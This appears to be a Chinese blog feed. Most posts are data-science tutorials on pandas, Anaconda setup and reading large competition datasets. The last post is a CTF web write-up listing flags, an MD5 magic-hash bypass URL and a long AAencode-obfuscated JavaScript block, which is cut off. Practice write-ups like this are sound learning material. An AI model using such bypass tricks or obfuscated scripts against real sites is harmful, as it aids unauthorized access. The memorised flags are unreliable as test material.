['foo', 'bar', 'foo', 'bar', ....: 'foo', 'bar', 'foo', 'foo'], ....: 'B' : ['one', 'one', 'two', 'three', ....: 'two', 'two', 'one', 'three'], ....: 'C' : np.random.randn(8), ....: 'D' : np.random.randn(8)&#125;)df 一列分组，然后对各个分组结果应用函数（sum）1df.groupby('A').sum() 多列根据多列分组，形成层次索引，从而可以对其使用函数。1df.groupby(['A','B']).sum() 数据重组（Reshaping）更多内容请查看 《Hierarchical Indexing》 和 《Reshaping》 Stack123456789# 准备工作tuples = list(zip(*[['bar', 'bar', 'baz', 'baz', ....: 'foo', 'foo', 'qux', 'qux'], ....: ['one', 'two', 'one', 'two', ....: 'one', 'two', 'one', 'two']]))index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second'])df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B'])df2 = df[:4]df2 12stacked = df2.stack()stacked 对于一个 “stacked” 的 DataFrame 或者 Series 对象 （它们的索引是层次索引），stack（）操作的逆操作是 unstack（），它默认情况下只处理末级层次的索引。 1stacked.unstack() 1stacked.unstack(1) 1stacked.unstack(0) 数据透视表（Pivot Tables）更多内容请查阅 Pivot Tables 1234567# 准备工作df = pd.DataFrame(&#123;'A' : ['one', 'one', 'two', 'three'] * 3, .....: 'B' : ['A', 'B', 'C'] * 4, .....: 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, .....: 'D' : np.random.randn(12), .....: 'E' : np.random.randn(12)&#125;)df 我们可以很简便地从数据中得到数据透视表1pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) 时间序列（Time Series）在频率转换重采样时，pandas具有简单强大有效的作用（比如说，把秒级采样的数据转换成 5分钟级别的数据）。这在金融领域非常常见，当然也不仅局限于此。更多内容请查阅 《Time Series section》 时分秒1234# 准备工作rng = pd.date_range('1/1/2012', periods=100, freq='S')ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng)ts （注：上图只截取了一部分的数据） 12# 转换ts.resample('5Min').sum() 时区时区表示1234# 准备工作rng = pd.date_range('3/6/2012 00:00', periods=5, freq='D')ts = pd.Series(np.random.randn(len(rng)), rng)ts 12ts_utc = ts.tz_localize('UTC')ts_utc 时区转换1ts_utc.tz_convert('US/Eastern') 时期转换（period）123rng = pd.date_range('1/1/2012', periods=5, freq='M')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 12ps = ts.to_period()ps 时间戳转换（timestamp）1ps.to_timestamp() 函数应用在 时期（period）和时间戳（timestamp）转换时有一些方便的算术函数可以使用。在下面的例子中，我们把以季度为频率的数据转换成以季度末月为频率的数据。123prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV')ts = pd.Series(np.random.randn(len(prng)), prng)ts 12ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9ts.head() 分类型数据（categorical）从 0.15版本开始，pandas的dataframe对象开始支持分类性数据（categorical data）。更多内容请查阅 《categorical introduction》 和 《API documentation》12df = pd.DataFrame(&#123;"id":[1,2,3,4,5,6], "raw_grade":['a', 'b', 'b', 'a', 'a', 'e']&#125;)df 转换将原始grade数据转换成分类型数据12df["grade"] = df["raw_grade"].astype("category")df["grade"] 重命名给分类型数据重命名为更有意义的名字。（通过 Series.cat.categories 来指派位置）12df["grade"].cat.categories = ["very good", "good", "very bad"]df 数据修整给分类型数据重排序，同时填补缺失值。（默认情况下， Series.cat 方法会返回一个新的Series类型 ）12df["grade"] = df["grade"].cat.set_categories(["very bad", "bad", "medium", "good", "very good"])df["grade"] 排序问题给分类型排序是按照 categories 的顺序，而不是按照字典顺序1df.sort_values(by="grade") 归类按照分类列来数据归类时，空的类别也会显示出来。1df.groupby("grade").size() 作图（Plotting）更多内容请看《Plotting》 基本画图1234# 数据ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))ts = ts.cumsum()ts 12# 作图ts.plot() dataframe作图在dataframe对象里，plot（）可以很方便地画出所有有标签的列。1234df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, .....: columns=['A', 'B', 'C', 'D'])df = df.cumsum()plt.figure(); df.plot(); plt.legend(loc='best') 数据读写（Getting Data In/Out）CSV写入把数据写进 CSV文件。更多内容请查阅 《Writing to a csv file》1df.to_csv('foo.csv') 读出将数据从 csv文件 中读出。更多内容请查阅 《Reading from a csv file》1pd.read_csv('foo.csv') HDF5更多内容请看 《HDFStores》 写入1df.to_hdf('foo.h5','df') 读出1pd.read_hdf('foo.h5','df') Excel更多内容请看 《MS Excel》 写入1df.to_excel('foo.xlsx', sheet_name='Sheet1') 读出1pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) 陷阱（Gotchas）如果你试着做这样的操作，你会得到如下信息。 更多信心请查看 《Comparisons》 和 《Gotchas》]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（4）ten Minutes to pandas中文版上]]></title>
      <url>%2F2017%2F02%2F01%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A%2F</url>
      <content type="text"><![CDATA[pandas官方文档中有一份快速入门教程《ten Minutes to pandas》，虽然网上早有其中文翻译，不过可能是旧版的：）所以闲来无事，自己也翻译最新版本的学习一下。 这里示例部分都由代码和运行结果图片组成，读者可以直接复制代码来运行；同时为了更清晰，加入了一些小结构标题，所以在小细节处跟官方文档略有不同。本机的运行环境是Python 3.5.2 |Anaconda 4.2.0 (64-bit) ，pandas库的版本为0.19.2，使用jupyter noterbook作为交互环境，对照的这份文档版本为 0.19.2 。这篇文章是对 ten-Minutes-to-pandas的上半部分的翻译。以下正文开始： 总说这是一份主要面向新手的对pandas库的简要介绍。想了解更多，你可以通过阅读Cookbook通常，我们像下面这样导入：123import pandas as pdimport numpy as npimport matplotlib.pylot as plt 创建对象（Object Creadtion）可以通过查看Data Structure Intro section来获取关于这节的更多内容 创建Series我们可以通过传递列表（list）来创建 Series，pandas会自动为其生成默认整数索引。12s = pd.Series([1,3,5,np.nan,6,8])s 创建DataFrame传递数组我们可通过传递数组对象（numpy array），时间索引（datetime index）、列标签（labeled columns）来创建 DataFrame12dates = pd.date_range('20130101',periods=6)dates 12df = pd.DataFrame(np.random.randn(6,4),index=dates,columns=list('ABCD'))df 传递字典我们可以通过传递一个能被转换成类似序列（Serise-like）的字典对象（dict）来创建 DataFrame 1234567df2 = pd.DataFrame(&#123; 'A' : 1.,....: 'B' : pd.Timestamp('20130102'),....: 'C' : pd.Series(1,index=list(range(4)),dtype='float32'),....: 'D' : np.array([3] * 4,dtype='int32'),....: 'E' : pd.Categorical(["test","train","test","train"]),....: 'F' : 'foo' &#125;)df2 它们的列有不同的数据类型1df2.dtypes IPython如果你使用 IPython ，那么tab键能自动补全 列名（column names）和 属性（ public attributes）。下面是能被自动补全的属性的一个子集：1df2. （注：如上图红箭头处按 tab键 ） 你可以看到，列名 A 等会被自动补齐……（原文：As you can see, the columns A, B, C, and D are automatically tab completed. E is there as well; the rest of the attributes have been truncated for brevity。 因为没有做和原文相似的图，所以这句只好：）不翻译了hh ） 查看数据（Viewing Data）查看 Basics section 获得关于这节的更多内容。 查看frame中的头部和尾部部分的行1df.head() 1df.tail() 显示索引、列名、底层numpy数据（the underlying numpy data）1df.index 1df.columns 1df.values （注：这个values，应该就是把df中的数据直接以numpy array的形式打印出来，注意与前面的 df 命令图片对比一下） 对数据进行快速简单统计1df.describe() (注：count：计数，多少个hh；mean：平均数；std：方差；min：最小值；25%：分位数； 50%：分位数，中位数；75%：分位数；max：最大值) 转置（Transposing）1df.T 排序按轴排序（Sorting by an axis）1df.sort_index(axis=1, ascending=True) （注：axis=1表明按照column来排序，关于axis的讨论参见 Stackoverflow:What does axis in pandas mean?；ascending=False说明要用降序排序，其默认值True代表升序） 按值排序（Sorting by values）1df.sort_values(by='B') （注：这里没有传入或没有显式指定ascending参数，则其默认值为True，为升序排列。） 选择（Selection）尽管python/numpy的关于选择（selecting ）和设定（setting）的表达式能直接（intuitive）在交互式环境（interactive work）中派上用场，但在实际工作中，我们推荐使用经过优化（optimized）的pandas方法：.at, .iat, .loc, .iloc 和 .ix. 想了解更多请查阅：《Indexing and Selecting Data》和《MultiIndex/Advanced Indexing》 获取数据（Getting）获取列选择单独的一列，返回一个 Series 对象，相当于 df.A1df['A'] （注：这里附上 df.A 的结果：） 获取行通过 [ ] 对行进行选取，这操作会对行进行切片（slice） 1df[0:3] 1df['20130102':'20130104'] 通过标签选择（Selection by Label）—— .loc（注：由于写这篇时间过长，jupyter notebook中前面的代码要重新运行一遍，而前面的示例中使用了random函数产生的随机值，所以重新运行后下面的数据会跟上面的数据不太一样，这里放上重新运行后 df值 的图，以作为对照。） 想了解关于本节更多内容请查看 Selection by Label 通过标签获得交叉区域（cross section）1df.loc[dates[0]] 通过标签进行多轴选择（multi-axis）1df.loc[:,['A','B']] 标签切片，两端确定1df.loc['20130102':'20130104',['A','B']] 缩减返回对象的维度1df.loc['20130102',['A','B']] 获取标量值1df.loc[dates[0],'A'] 快速获取标量值结果与前面一个方法相同1df.at[dates[0],'A'] （注：.loc和 .at运行时间对比如下：） 通过位置选择（Selection by Position）—— .iloc想了解本节更多内容请查看 Selection by Position 通过传入整数来选择1df.iloc[3] 数值切片，跟numpy/python类似1df.iloc[3:5,0:2] 传入指定位置（整数）的列表，与numpy/python类似1df.iloc[[1,2,4],[0,2]] 对行切片（slicing rows）1df.iloc[1:3,:] 对列切片（slicing columns）1df.iloc[:,1:3] 取值（标量值）1df.iloc[1,1] 更快取值（标量值）1df.iat[1,1] （注：以下是 .iloc 和 .iat 的时间比较。） 通过布尔表达式进行索引（Boolean Indexing）使用单独一列来选择数据1df[df.A &gt; 0] 使用 where 操作来选择数据1df[df &gt; 0] （注：虽然没有出现where，但这个确实是where操作） 使用 isin() 方法来过滤数据1234# 准备工作df2 = df.copy()df2['E'] = ['one', 'one','two','three','four','three']df2 12# 使用isin()df2[df2['E'].isin(['two','four'])] 设置（Setting）设置新的列，使其数据自动按索引排列123# 准备工作s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20130102', periods=6))s1 123# 设置新的列df['F'] = s1df 通过标签（label）来设置数值1df.at[dates[0],'A'] = 0 通过位置（position）来设置数值1df.iat[0,1] = 0 通过指定numpy数组来设置数值1df.loc[:,'D'] = np.array([5] * len(df)) 经过前面一堆操作后的结果： 通过 where 操作来设置数值123df2 = df.copy()df2[df2 &gt; 0] = -df2df2 处理缺失值（Missing Data）pandas主要用值 np.nan 来表示缺失值。默认情况下，它不会参与计算。更多内容查看 Missing Data section 重索引（Reindexing）重索引能让你对特定的轴（axis）来进行索引的改变/添加/删除。它会返回一个复制值（注：也就是说不会改变原本的数据）。123df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E'])df1.loc[dates[0]:dates[1],'E'] = 1df1 删除所有具有缺失值的行（dropna）1df1.dropna(how='any') 填充缺失值（fillna）1df1.fillna(value=5) 缺失值的布尔表达式（isnull）1pd.isnull(df1) 剩余内容请看：数据挖掘比赛（5）ten Minutes to pandas中文版下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（3）申请anaconda-academic-license并使用]]></title>
      <url>%2F2017%2F01%2F29%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[Anaconda是python的一个科学计算发行版，里面集成了各种各样的科学计算包，如numpy、pandas、sklearn等。作为学生，在使用anaconda发行版的同时，我们可以申请anaconda的学术证书，通过它可以下载一些额外的包以实现计算过程的加速。 注册、申请、下载注册地址：https://anaconda.org/ 其中的email要用学校邮箱，否则不能申请成功。我的邮箱是 **@stu.xmu.edu.cn 在注册完了后，先点右上角的头像处，再选择My Setting 如下： 选择add ons 将右边的三个license下载下来：MKL Optimizations、IOPro、Anaconda Accelerate。 安装先打开命令行，输入如下命令（注，我这里以windows下为例），确定license的安装位置。 conda info --license 如图 （注：ASUS即用户的主文件夹，各位根据自己的电脑调整） 然后将下载的3个license（即txt文件）放到 .continuum 文件夹里面。这里注意下，如果打开个人文件夹(这里即ASUS文件夹)没看到 .continuum ，那要记得勾选一下显示隐藏文件。如果还不存在，那需要自己创建 .continuum 文件夹。如下： 然后打开命令行，分别输入 conda install accelerate conda install iopro 注意，是分别输入，而且在安装accelerate时为满足dependency会同时安装mkl，所以就不单独输入conda install mkl了。比如安装 accelerate 模块，如下： 跟着提示来，下载过程可能有点慢：） 测试使用以accelerate为例，从add ons页面中可以看出acelerate的作用是： Fast Python for GPUs and multi-core with NumbaPro and MKL Optimizations. 在安装accelerate后我们可以利用GPU显卡来加速计算过程。不过查了官方文档搜了stackoverflow翻遍了google和百度都没有找到单独关于acclerate库的使用，大多数的讨论集中于在安装后对numba的使用，所以这里用numba来测试一下加快了多少。在测试前我把显卡的驱动升级了下，接下来确定一下机子的显卡是否支持。命令行打开，输入：123import numba.cuda.api,numba.cuda.cudadrv.libsnumba.cuda.cudadrv.libs.test()numba.cuda.api.detect() 第一行导入库，第二行用来检测库的安装正确，第三行用来确定显卡是否支持加速。 下面是测试代码（网上找的稍微修改了下，自己还写不出来）：1234567891011121314151617181920212223242526272829303132333435import numpy as npfrom numba import jitnobs = 1000000def proc_numpy(x,y,z): x = x*2 - ( y * 55 ) # these 4 lines represent use cases y = x + y*2 # where the processing time is mostly z = x + y + 99 # a function of, say, 50 to 200 lines z = z * ( z - .88 ) # of fairly simple numerical operations return z@jitdef proc_numba(xx,yy,zz): for j in range(nobs): # as pointed out by Llopis, this for loop x, y = xx[j], yy[j] # is not needed here. it is here by # accident because in the original benchmarks x = x*2 - ( y * 55 ) # I was doing data creation inside the function y = x + y*2 # instead of passing it in as an array z = x + y + 99 # in any case, this redundant code seems to z = z * ( z - .88 ) # have something to do with the code running # faster. without the redundant code, the zz[j] = z # numba and numpy functions are exactly the same. return zzx = np.random.randn(nobs)y = np.random.randn(nobs)z = np.zeros(nobs)res_numpy = proc_numpy(x,y,z)z = np.zeros(nobs)res_numba = proc_numba(x,y,z)%timeit proc_numpy(x,y,z)%timeit proc_numba(x,y,z) 结果如图,第一行是用cpu计算的时间，2.06ms；第二行是gpu计算的时间 121μs；就本例而言快了17倍左右。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（2）利用pandas读取大型数据集]]></title>
      <url>%2F2017%2F01%2F25%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86%2F</url>
      <content type="text"><![CDATA[数据比赛中，有时提供的数据集会很大，常规方法打不开，这时候就需要在读入时做些小处理，方便后续操作。 读入以IJCAI-17比赛数据集中的user_pay.txt 和 user_view.txt 为例，user_pay.txt有 2.13Gb 之大，而user_view.txt 只有 174Mb 。两者的读入方法见下。 对于 user_view.txt 这种较小型的数据 ，直接读入即可。如下：123import pandas as pduser_view_db = pd.read_table('user_view.txt',header=None,sep=',')user_view_db.head() 但对于如 2.13Gb大的 user_pay.txt 的大型数据，如果直接读入，会让硬盘和内存飙满且速度非常慢（机子好的童鞋请忽略—）。对此，采取的策略是分块读入。在用 read_table 读入时指定 chunksize 参数和 iterator参数，如下：1user_pay_db = pd.read_table('user_pay.txt',header=None,sep=',',iterator=True,chunksize=10000) (注：chunksize等于多少可以自己选定，iterator=True好像一般都这么设定：）至于why在stackoverflow上有相关问题但似乎没有满意的答案) 可以看到多了两个参数后，user_pay_db 不再是dataframe了，而是pandas.io.parsers.TextFileReader。想要查看它可以如下：12for chunk in user_pay_db: print(chunk) 它会按照 chunksize 的大小打印出内容，如下: （由于数据集过大，只截取部分内容） 处理接下来的处理有两种，一是可以直接对 user_pay_db 中的每个 chunk 进行分块处理，也可以想办法把 此时为TextFileReader的 user_pay_db 转化为易于操作的 dataframe格式。这里只演示第二种方法。 我们可以借助 pandas 中的concat方法来合并数据集。如下：1df = pd.concat([chunk for chunk in user_pay_db],ignore_index=True) 这里用变量df来存储。我们给concat传了两个参数，第一个是利用了for循环，注意不要忽略了中括号；第二个参数用于告诉concat连接时忽略掉每个chunk中原有的index，否则等连接完后，会出现同一个index对应了多个项的情况，如下： 小结（题外话）上面的代码是基于 Anaconda 4.2.0 (64-bit)集成包的。其pandas版本为0.18.1，而最新的pandas版本为0.19，其中的一些函数的使用方法做了更新，比如concat。希望读者在上述代码运行不了不对的情况下能查查文档留留言一起讨论：） 下面附上pandas的文档地址 pandas 0.18.1 文档 pandas 0.19.2 文档 不清楚自己pandas版本的，见下,其中version前后都是两个下划线__： 欢迎留言：）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（1）对无列名的txt数据集读取方法及处理]]></title>
      <url>%2F2017%2F01%2F24%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[接触大数据比赛，必然要接触大数据（&lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。 基本的读入其实python里已经集成了csv模块了，不过使用起来不那么方便。一般而言，使用pandas库可以把数据读入成dataframe形式方便操作。 读入csv文件以kaggle的titanic数据集为例用pandas读入的代码如下:12import pandas as pdtitanic_db = pd.read_csv('titanic_train.csv') 这样就能把数据集读进来了，如下：几道’\’是可能因为屏幕小（，，ԾㅂԾ，，）而产生的换行提示。显示出来的有5行（0~5），每行的上面都有对应的列名。 读入txt文件以IJCAI-17比赛数据集中的user_view.txt为例notepad++打开如下：用pandas读入的代码如下:12import pandas as pduser_view = pd.read_table('user_view.txt') 注意代码应该是 read_table .结果如下可以看到读入后，pandas把txt文件的第一行当做了列名，很明显这是错误的:) 这个我们下面来进行修正。 针对无列名文件第一行的读入处理上面提到的 read_csv 、read_table 等，其实他们的参数不仅仅只有一个。为了让无列名的数据读入正确，我们可以在读入的时候多指定一个参数header=None。以user_view.txt为例。1user_view = pd.read_table('user_view.txt'，header=None) 读入结果如下： 可以看到读入后，原txt文件中的第一行有了Index（即 0），不再被识别为列名。 对txt数据集读入处理为正常的dataframe形式在指定header=None读入txt文件后，pandas自动给添了个列名 0，这表明读入的每一行其实都是读入了一字符串，总共只有 1 列！对数据的操作很不方便 所以我们在遇到这种情况时，我们还要继续指定参数sep，告诉pandas以什么为分隔符。以user_view.txt为例，从上图可知每行的数据有三个部分，用逗号(，)相隔开。所以在读入时，如下：1user_view = pd.read_table('user_view.txt'，header=None，sep='，') 可以发现每列（3列）的列名被设置为 0 1 2，这样我们可以很方便地对数据进行操作。 给无列名的数据集添加列名法一：直接操作好吧，这个方法当然是最简单的，csv用excel打开，txt用notepad++、sublime打开，然后自己填上列名，再正常读入就行了嘛! 只是通常情况下，所遇到的数据集比较大，用excel或者notepad等难以打开，又或者打开后不好操作，局限性比较大。同时在直接操作添加时还要考虑原数据集的格式和编码，方便后面进一步读入。 法二：在利用pandas读入时指定列名以user_view.txt数据集为例，阿里天池上的数据说明是 Field Sample Description user_id 0000000001 用户id shop_id 000001 商家id，与shop_info对应 time_stamp 2015-10-10 10:00:00 浏览时间 所以在读入时，我们可以再指定一个参数 names .对照上述说明和基于前面的操作()，代码如下：123import pandas as pdcolumns = ['user_id','shop_id','time_stamp']user_view_db = user_view_db = pd.read_table('user_view.txt',header=None,sep=',',names=columns) 结果如下： 法三：在用pandas读入后再制定列名在完成如前面基本的读入和处理后，此时 user_view_db 应该是 列名为[0,1,2] 的datframe了。此时我们再通过指定其属性columns来指定列名。1user_view_db.columns=['user_id','shop_id','time_stamp'] 如下：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（0）环境搭建之anaconda安装]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85%2F</url>
      <content type="text"><![CDATA[最近开始接触一些kaggle的比赛，需要搭建基本的环境。原本在本机和服务器上“搭好了”，numpy.test()等都没有问题，同样的代码却运行出了不同的结果… 后面接触到了 anaconda这个集成的python科学计算环境，一键式解决大部分问题，甚至在win下也能安装：)这样也省去了开一大堆虚拟机的麻烦。 简介网上各种简介一大堆，对我而言……scipy在win下死活没装上，不过在 anaconda 里已经很好的集成了，嗯不多说了。 下载按理我们都是去官网（https://www.continuum.io/downloads）下载，不过下载速度十分可观，不知道翻墙后能不能好点。我的方法是在浏览器下载时复制其下载链接，然后放到百度云里面离线下载，可能会出现链接失效的情况，但其实只要一直点离线下载：) 一般最后会成功的。下面这两个是我刚离线完的，目前还是最新版，各位如果需要可以保存一下。 Anaconda3-4.2.0-Windows-x86： 链接：http://pan.baidu.com/s/1hsxB3MG 密码：5k0x Anaconda3-4.2.0-Linux-x86_64.sh 链接：http://pan.baidu.com/s/1dETp0LN 密码：xm7x 这两个版本是python3，64bit的. 大家自己看着办：) 安装win平台下的安装很简单，傻瓜式操作，中间会有两个选项用来把anaconda加入系统环境变量，安装后系统环境如下： ubuntu下的安装，在虚拟机安装时挺顺利的，但在云服务器上除了一点小问题，可能跟服务器的初始环境有关吧:) 运行一下sh脚本，跟着提示来，最后一步是问是否要把anaconda加入系统环境变量，选yes一般来讲应该是能成功的。如果在最后一步时没有成功或者说输入了yes以外的值而导致无法默认运行anaconda的话，也可以按照如下做法（以云服务器上为例，这里我顺便把最基本操作写出来吧，$表示在terminal里的意思……）： $ vim /home/ubuntu/.bashrc 按键盘字母 i ， 在最后面加入一句： export PATH=/home/ubuntu/anaconda3/bin:$PATH 按键盘上 ESC ，再按 ：，输入 wq 退出vim $ source /home/ubuntu/.bashrc 如下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pwn思维导图]]></title>
      <url>%2F2017%2F01%2F13%2Fpwn%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
      <content type="text"><![CDATA[]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[南邮CTF平台web前30题解]]></title>
      <url>%2F2017%2F01%2F12%2F%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[1、查看源代码view-source:http://chinalover.sinaapp.com/web1/nctf{flag_admiaanaaaaaaaaaaa} 2、MD5碰撞http://115.28.150.176/md5/index.php?a=240610708nctf{md5_collision_is_easy} 3、绕过长度限制，firebug修改限制长度nctf{follow_me_to_exploit} 4、下载该gif文件，010编辑器打开， 最后nctf{photo_can_also_hid3_msg} 5、所谓层层递进，就是一层一层的慢慢找吧view-source:http://chinalover.sinaapp.com/web3/404.html nctf{this_is_a_fl4g} 6、 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#39;_&#39;)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [(ﾟｰﾟ) # (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ 